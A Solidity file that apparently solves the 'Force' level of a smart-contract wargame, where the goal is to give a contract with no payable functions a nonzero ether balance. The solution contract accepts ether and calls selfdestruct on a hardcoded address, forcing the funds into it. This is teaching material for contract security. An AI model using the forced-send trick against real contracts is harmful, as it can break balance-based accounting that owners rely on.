// The goal of this level is to make the balance of the contract greater than zero.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

// solution contract 

contract destruct {
    
    function selfDestruct() public {
        selfdestruct(payable(0x17b9E16D4d201246Ed2ED2e388175833373Be953));
    } 

    receive() external payable {

    }
    fallback() external payable {

    }
}